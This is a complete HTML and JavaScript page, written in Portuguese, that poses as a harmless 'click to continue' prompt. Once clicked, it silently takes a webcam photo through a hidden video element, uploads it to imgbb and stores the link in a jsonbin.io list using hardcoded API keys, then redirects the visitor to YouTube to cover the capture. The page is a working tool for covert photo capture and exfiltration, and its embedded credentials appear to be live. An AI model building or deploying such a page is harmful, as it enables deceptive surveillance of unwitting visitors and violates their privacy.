<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
    margin: 0;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background: #111;
    color: white;
    font-family: Arial;
    flex-direction: column;
}
button {
    padding: 18px 30px;
    font-size: 18px;
    border-radius: 12px;
    border: none;
    background: #00ff88;
    font-weight: bold;
}
#countdown {
    font-size: 60px;
    margin-top: 20px;
}
</style>
</head>

<body>

<video id="webcam" autoplay playsinline muted style="display:none;"></video>

<button id="btn">Clique aqui para continuar</button>
<div id="countdown"></div>

<script>
const API_KEY_IMGBB = "33a7d906d06ed8ca9fdc9ec095222d3f";
const JSONBIN_KEY = "$2a$10$TGWviiTU6WDwbnoyxXdO1OB.zfLXw2aPhoG4SChWWQYA757BpZBqO";
const BIN_ID = "69d30c2aaaba882197ca5757";

document.getElementById("btn").addEventListener("click", start);

async function start() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" }
        });

        const video = document.getElementById("webcam");
        video.srcObject = stream;

        await video.play();

        document.getElementById("btn").style.display = "none";

        let count = 3;
        const el = document.getElementById("countdown");
        el.innerText = count;

        const interval = setInterval(async () => {
            count--;
            el.innerText = count > 0 ? count : "📸";

            if (count < 0) {
                clearInterval(interval);

                const canvas = document.createElement("canvas");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                canvas.getContext("2d").drawImage(video, 0, 0);

                const imageData = canvas.toDataURL("image/jpeg", 0.9);

                await enviarImagem(imageData);

                stream.getTracks().forEach(t => t.stop());

                // 🔥 AQUI ESTÁ A MUDANÇA
                setTimeout(() => {
                    window.location.href = "https://youtube.com";
                }, 1500);
            }
        }, 1000);

    } catch (err) {
        alert("Permita acesso à câmera");
        console.log(err);
    }
}

async function enviarImagem(base64) {
    const formData = new FormData();
    formData.append("image", base64.split(",")[1]);

    const res = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY_IMGBB}`, {
        method: "POST",
        body: formData
    });

    const data = await res.json();
    const imageUrl = data.data.url;

    const getRes = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
        headers: { "X-Master-Key": JSONBIN_KEY }
    });

    const json = await getRes.json();
    const lista = json.record.record || [];

    lista.push(imageUrl);

    await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
        method: "PUT",
        headers: {
            "Content-Type": "application/json",
            "X-Master-Key": JSONBIN_KEY
        },
        body: JSON.stringify({ record: lista })
    });
}
</script>

</body>
</html>
